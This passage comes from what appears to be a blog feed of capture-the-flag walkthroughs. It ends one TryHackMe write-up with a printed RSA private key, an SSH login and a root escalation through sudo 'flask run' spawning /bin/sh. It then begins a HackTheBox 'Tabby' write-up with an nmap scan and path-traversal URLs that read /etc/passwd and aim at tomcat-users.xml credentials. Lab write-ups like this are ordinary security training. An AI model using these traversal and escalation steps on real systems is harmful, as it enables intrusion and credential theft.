<span class="n">o7FERO2oy3I5jUOlULsr9BwQpNFA2Qenc4Wc7ghb0LfCVaUs</span><span class="o">/</span><span class="no">RHQ7IQ4F3yp</span><span class="o">/</span><span class="no">G67</span>
<span class="mi">54</span><span class="n">oLue6hAoGBAPCe</span><span class="o">+</span><span class="no">WsnOXzhwQ9WXglhfztDR1lcwSFMeHZpcxYUVqmVEi2ZMLll</span>
<span class="no">B67SCri9lHHyvBtrH7YmZO5Q9UcGXdLCZGmbkJUdX2bjqV0zwwx1qOiVY8LPnZSJ</span>
<span class="no">LJN</span><span class="o">+</span><span class="mi">0</span><span class="n">p1dRHsO3n4vTHO8mVuiM5THi6pcgzSTggIhS</span><span class="o">+</span><span class="n">e1ks7nlQKiBuD</span><span class="o">/</span><span class="no">AoGBAOE2</span>
<span class="n">kwAMtvI03JlkjvOHsN5IhMbOXP0zaRSrKZArDCcqDojDL</span><span class="o">/</span><span class="no">AQltQkkLtQPdUPJgdY</span>
<span class="mi">3</span><span class="n">gOkUJ2BCHNlIsAtUjrTj</span><span class="o">+</span><span class="no">T76N512rO2sSidOEXRDCc</span><span class="o">+</span><span class="n">g</span><span class="o">/</span><span class="no">QwdgENiq</span><span class="o">/</span><span class="n">w9JroeWFc</span>
<span class="n">g9qM3f2cl</span><span class="o">/</span><span class="no">EkjxRgiyuTfK6mbzcuMSveX4LfCXepAoGAd2MZc</span><span class="o">+</span><span class="mi">4</span><span class="no">ZWvoUNUzwCY2D</span>
<span class="n">eF8QVqlr9d6gYng9rvXWbfvV8iPxBfu3zSjQQwtlTQhYBu6m5FS2fXxTxrLE</span><span class="o">+</span><span class="no">J6U</span>
<span class="sr">/cU+/o</span><span class="mi">19</span><span class="no">WWqaDPFy1IrIjOYagn1KvXk2UdR6IbQ2FyywfkFvmHk6Sjn3h9leVd</span><span class="o">/</span><span class="n">j</span>
<span class="no">BcIunmnw5H214s0KpSzJZvcCgYA5Ca9VNeMnmIe</span><span class="o">+</span><span class="no">OZ</span><span class="o">+</span><span class="no">Swezjfw5Ro3YdkmWsnGTc</span>
<span class="no">ZGqhiJ9Bt91uOWVZuSEGr53ZVgrVlYY0</span><span class="o">+</span><span class="n">eqI2WMghp60eUX4LBinb71cihCnrz9S</span>
<span class="sr">/+5+kCE51zVoJNXeEmXrhWUNzo7fP6UNNtwKHRzGL/</span><span class="no">IkwQa</span><span class="o">+</span><span class="no">NI5BVVmZahN9</span><span class="o">/</span><span class="n">sXF</span>
<span class="n">yWMGcQKBgQDheyI7eKTDMsrEXwMUpl5aiwWPKJ0gY</span><span class="o">/</span><span class="mi">2</span><span class="n">hS0WO3XGQtx6HBwg6jJKw</span>
<span class="no">MMn8PNqYKF3DWex59PYiy5ZL1pUG2Y</span><span class="o">+</span><span class="n">iadGfIbStSZzN4nItF5</span><span class="o">+</span><span class="n">yC42Q2wlhtwgt</span>
<span class="n">i4MU8bepL</span><span class="o">/</span><span class="no">GTMgaiR8RmU2qY7wRxfK2Yd</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="no">GDuzLPEoS7ONNjLhNA</span><span class="o">==</span>
<span class="o">-----</span><span class="k">END</span> <span class="no">RSA</span> <span class="no">PRIVATE</span> <span class="no">KEY</span><span class="o">-----</span>
</code></pre></div></div>
<h2 id="ssh-to-prof">SSH to Prof</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="nd">@Ac3</span><span class="p">:</span><span class="o">~/</span><span class="n">Haskhell</span><span class="c1"># ssh -i id_rsa prof@hask.thm
</span><span class="n">The</span> <span class="n">authenticity</span> <span class="n">of</span> <span class="n">host</span> <span class="sh">'</span><span class="s">hask.thm (10.10.129.213)</span><span class="sh">'</span> <span class="n">can</span><span class="sh">'</span><span class="s">t be established.
ECDSA key fingerprint is SHA256:hx58wuaesK7WY+jWhWJdlCKNY2TR3P0MqLqqDTwVtZA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added </span><span class="sh">'</span><span class="n">hask</span><span class="p">.</span><span class="n">thm</span><span class="p">,</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">129.213</span><span class="sh">'</span><span class="s"> (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul  8 08:06:37 UTC 2020

  System load:  0.0                Processes:           108
  Usage of /:   26.3% of 19.56GB   Users logged in:     0
  Memory usage: 48%                IP address for eth0: 10.10.129.213
  Swap usage:   0%


39 packages can be updated.
0 updates are security updates.


Last login: Wed May 27 18:45:06 2020 from 192.168.126.128
$ id
uid=1002(prof) gid=1002(prof) groups=1002(prof)
</span></code></pre></div></div>

<blockquote>
  <p>We can use <code class="language-plaintext highlighter-rouge">python -c 'import pty;pty.spawn("/bin/bash");'</code> for a shell upgrade.</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
$ python -c 'import pty;pty.spawn("/bin/bash");'
prof@haskhell:~$ 

</code></pre></div></div>

<h2 id="checking-the-priv-of-prof">Checking the priv of <code class="language-plaintext highlighter-rouge">prof</code></h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>prof@haskhell:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>prof on haskhell:
    env_reset, env_keep+<span class="o">=</span>FLASK_APP, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User prof may run the following commands on haskhell:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/flask run
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>prof@haskhell:~<span class="nv">$ </span>nano root.py
import os
os.system<span class="o">(</span><span class="s2">"/bin/sh"</span><span class="o">)</span>
prof@haskhell:~<span class="nv">$ </span>nano root.py
prof@haskhell:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">FLASK_APP</span><span class="o">=</span>root.py
prof@haskhell:~<span class="nv">$ </span><span class="nb">sudo </span>flask run
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="c"># cat /root/root.txt</span>
flag<span class="o">{</span><span class="k">*****************</span><span class="o">}</span>
</code></pre></div></div>

<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.<br />
My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>]]></content><author><name>jeevan</name></author><category term="[&quot;tryhackme&quot;]" /><category term="linux" /><category term="gobuster" /><category term="boot2root" /><summary type="html"><![CDATA[HaskHell is medium level machine in TryHackMe. It is based on uploading unrestricted file uploads and exploiting it.]]></summary></entry><entry><title type="html">HackTheBox Tabby</title><link href="http://localhost:4000/hackthebox/retired/2020/07/06/Tabby.html" rel="alternate" type="text/html" title="HackTheBox Tabby" /><published>2020-07-06T22:09:00+05:30</published><updated>2020-07-06T22:09:00+05:30</updated><id>http://localhost:4000/hackthebox/retired/2020/07/06/Tabby</id><content type="html" xml:base="http://localhost:4000/hackthebox/retired/2020/07/06/Tabby.html"><![CDATA[<h2 id="lets-get-started">Let’s get started</h2>

<table>
  <thead>
    <tr>
      <th>Column</th>
      <th> </th>
      <th> </th>
      <th> </th>
      <th>Detail</th>
      <th> </th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>OS:</td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td>Linux</td>
    </tr>
    <tr>
      <td>Difficulty:</td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td>Easy</td>
    </tr>
    <tr>
      <td>Points:</td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td>20</td>
    </tr>
    <tr>
      <td>Release:</td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td>20 Jun 2020</td>
    </tr>
    <tr>
      <td>IP:</td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td>10.10.10.194</td>
    </tr>
  </tbody>
</table>

<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span>
Discovered open port 80/tcp on 10.10.10.194
Discovered open port 8080/tcp on 10.10.10.194
Discovered open port 22/tcp on 10.10.10.194
Completed SYN Stealth Scan at 07:52, 2.07s elapsed <span class="o">(</span>1000 total ports<span class="o">)</span>
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp   open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
No exact OS matches <span class="k">for </span>host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span><span class="nb">.</span>
TCP/IP fingerprint:
OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.80%E<span class="o">=</span>4%D<span class="o">=</span>6/21%OT<span class="o">=</span>22%CT<span class="o">=</span>1%CU<span class="o">=</span>41896%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>T%G<span class="o">=</span>Y%TM<span class="o">=</span>5EEF000
OS:0%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>105%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10C%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%II<span class="o">=</span>I%TS<span class="o">=</span>A<span class="o">)</span>OPS
OS:<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M54DST11NW7%O2<span class="o">=</span>M54DST11NW7%O3<span class="o">=</span>M54DNNT11NW7%O4<span class="o">=</span>M54DST11NW7%O5<span class="o">=</span>M54DST1
OS:1NW7%O6<span class="o">=</span>M54DST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>FE88%W2<span class="o">=</span>FE88%W3<span class="o">=</span>FE88%W4<span class="o">=</span>FE88%W5<span class="o">=</span>FE88%W6<span class="o">=</span>FE88<span class="o">)</span>ECN
OS:<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>FAF0%O<span class="o">=</span>M54DNNSNW7%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>A
OS:S%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span>R
OS:<span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F
OS:<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%
OS:T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>40%CD
OS:<span class="o">=</span>S<span class="o">)</span>

Uptime guess: 12.366 days <span class="o">(</span>since Tue Jun  9 00:49:25 2020<span class="o">)</span>
Network Distance: 2 hops
TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span>261 <span class="o">(</span>Good luck!<span class="o">)</span>
IP ID Sequence Generation: All zeros
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE <span class="o">(</span>using port 995/tcp<span class="o">)</span>
HOP RTT       ADDRESS
1   128.32 ms 10.10.14.1
2   128.88 ms 10.10.10.194

NSE: Script Post-scanning.
Initiating NSE at 09:36
Completed NSE at 09:36, 0.00s elapsed
Initiating NSE at 09:36
Completed NSE at 09:36, 0.00s elapsed
Initiating NSE at 09:36
Completed NSE at 09:36, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>31.88 seconds
           Raw packets sent: 1289 <span class="o">(</span>61.746KB<span class="o">)</span> | Rcvd: 1410 <span class="o">(</span>433.356KB<span class="o">)</span>
</code></pre></div></div>
<p>On visiting the <code class="language-plaintext highlighter-rouge">port 80</code> there is a website <code class="language-plaintext highlighter-rouge">Megahosting.HTB</code> with some content on it.</p>

<p><img src="/assets/img/sample/tabby/tabby1.png" alt="" /></p>

<p>So I desided to add <code class="language-plaintext highlighter-rouge">megahosting.htb</code> to  <code class="language-plaintext highlighter-rouge">/etc/hosts</code> in my kali.</p>

<blockquote>
  <p><code class="language-plaintext highlighter-rouge">10.10.10.194 tabby.htb megahosting.htb</code></p>
</blockquote>

<p>After all the things are done, then I came to see that a <code class="language-plaintext highlighter-rouge">URL</code> ` http://megahosting.htb/news.php?file=statement<code class="language-plaintext highlighter-rouge"> looks like </code>LFI` is going to work out.</p>

<p><img src="/assets/img/sample/tabby/tabby2.png" alt="" /></p>

<h2 id="lfi">LFI</h2>

<p>A file inclusion vulnerability is a type of web vulnerability that is most commonly found to affect web applications that rely on a scripting run time.</p>

<p>So I was able to get the /etc/passwd by doing so <code class="language-plaintext highlighter-rouge">http://megahosting.htb/news.php?file=../.../etc/passwd</code>. we get directory traversal.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="ss">:x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="ss">:root:/</span><span class="n">root</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">daemon</span><span class="ss">:x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="ss">:daemon:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">bin</span><span class="ss">:x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="ss">:bin:/</span><span class="n">bin</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sys</span><span class="ss">:x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="ss">:sys:/</span><span class="n">dev</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sync</span><span class="ss">:x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="ss">:sync:/</span><span class="n">bin</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">sync</span>
<span class="n">games</span><span class="ss">:x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="ss">:games:/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">man</span><span class="ss">:x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="ss">:man:/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">lp</span><span class="ss">:x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="ss">:lp:/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">mail</span><span class="ss">:x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="ss">:mail:/</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">news</span><span class="ss">:x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="ss">:news:/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">uucp</span><span class="ss">:x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="ss">:uucp:/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">proxy</span><span class="ss">:x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="ss">:proxy:/</span><span class="n">bin</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="ss">:x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="ss">:www</span><span class="o">-</span><span class="n">data</span><span class="ss">:/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">backup</span><span class="ss">:x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="ss">:backup:/</span><span class="n">var</span><span class="o">/</span><span class="n">backups</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">list</span><span class="ss">:x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="ss">:Mailing</span> <span class="no">List</span> <span class="no">Manager</span><span class="ss">:/</span><span class="n">var</span><span class="o">/</span><span class="n">list</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">irc</span><span class="ss">:x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="ss">:ircd:/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">gnats</span><span class="ss">:x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="ss">:Gnats</span> <span class="no">Bug</span><span class="o">-</span><span class="no">Reporting</span> <span class="no">System</span> <span class="p">(</span><span class="n">admin</span><span class="p">)</span><span class="ss">:/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">nobody</span><span class="ss">:x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="ss">:nobody:/</span><span class="n">nonexistent</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="ss">:x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">102</span><span class="ss">:systemd</span> <span class="no">Network</span> <span class="no">Management</span><span class="p">,,,</span><span class="ss">:/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="ss">:x</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="mi">103</span><span class="ss">:systemd</span> <span class="no">Resolver</span><span class="p">,,,</span><span class="ss">:/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="ss">:x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">104</span><span class="ss">:systemd</span> <span class="no">Time</span> <span class="no">Synchronization</span><span class="p">,,,</span><span class="ss">:/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">messagebus</span><span class="ss">:x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">106</span><span class="o">::/</span><span class="n">nonexistent</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">syslog</span><span class="ss">:x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">110</span><span class="o">::/</span><span class="n">home</span><span class="o">/</span><span class="n">syslog</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">_apt</span><span class="ss">:x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">65534</span><span class="o">::/</span><span class="n">nonexistent</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">tss</span><span class="ss">:x</span><span class="p">:</span><span class="mi">106</span><span class="p">:</span><span class="mi">111</span><span class="ss">:TPM</span> <span class="n">software</span> <span class="n">stack</span><span class="p">,,,</span><span class="ss">:/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">tpm</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="kp">false</span>
<span class="n">uuidd</span><span class="ss">:x</span><span class="p">:</span><span class="mi">107</span><span class="p">:</span><span class="mi">112</span><span class="o">::/</span><span class="n">run</span><span class="o">/</span><span class="n">uuidd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">tcpdump</span><span class="ss">:x</span><span class="p">:</span><span class="mi">108</span><span class="p">:</span><span class="mi">113</span><span class="o">::/</span><span class="n">nonexistent</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">landscape</span><span class="ss">:x</span><span class="p">:</span><span class="mi">109</span><span class="p">:</span><span class="mi">115</span><span class="o">::/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">landscape</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">pollinate</span><span class="ss">:x</span><span class="p">:</span><span class="mi">110</span><span class="p">:</span><span class="mi">1</span><span class="o">::/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">pollinate</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="kp">false</span>
<span class="n">sshd</span><span class="ss">:x</span><span class="p">:</span><span class="mi">111</span><span class="p">:</span><span class="mi">65534</span><span class="o">::/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">coredump</span><span class="ss">:x</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="mi">999</span><span class="ss">:systemd</span> <span class="no">Core</span> <span class="no">Dumper</span><span class="ss">:/:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">lxd</span><span class="ss">:x</span><span class="p">:</span><span class="mi">998</span><span class="p">:</span><span class="mi">100</span><span class="o">::/</span><span class="n">var</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">lxd</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">lxd</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="kp">false</span>
<span class="n">tomcat</span><span class="ss">:x</span><span class="p">:</span><span class="mi">997</span><span class="p">:</span><span class="mi">997</span><span class="o">::/</span><span class="n">opt</span><span class="o">/</span><span class="n">tomcat</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="kp">false</span>
<span class="n">mysql</span><span class="ss">:x</span><span class="p">:</span><span class="mi">112</span><span class="p">:</span><span class="mi">120</span><span class="ss">:MySQL</span> <span class="no">Server</span><span class="p">,,,</span><span class="ss">:/</span><span class="n">nonexistent</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="kp">false</span>
<span class="n">ash</span><span class="ss">:x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="ss">:clive:/</span><span class="n">home</span><span class="o">/</span><span class="n">ash</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
</code></pre></div></div>

<p>Now visiting the other part of the http webpage <code class="language-plaintext highlighter-rouge">8080</code>, which is a single page running tomcat server.</p>

<p><img src="/assets/img/sample/tabby/tabby3.png" alt="" /></p>

<p>Seeing that page, i felt that <code class="language-plaintext highlighter-rouge">LFI</code> should work on this page too.</p>

<p>If <code class="language-plaintext highlighter-rouge">LFI</code> works in the right way as intended, then the <code class="language-plaintext highlighter-rouge">credentials</code> should be found in <code>tomcat-users.xml</code>.</p>

<p>After a little bit of research and directory fuzzing I came to see that the correct path is <code class="language-plaintext highlighter-rouge">/usr/share/tomcat9/etc/tomcat-users.xml</code></p>

<p>Going to the <code class="language-plaintext highlighter-rouge">source-code</code> of the url: I was able to find the cred of the user.</p>

<p><code class="language-plaintext highlighter-rouge">http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml </code></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;role <span class="nv">rolename</span><span class="o">=</span><span class="s2">"admin-gui"</span>/&gt;
   &lt;role <span class="nv">rolename</span><span class="o">=</span><span class="s2">"manager-script"</span>/&gt;
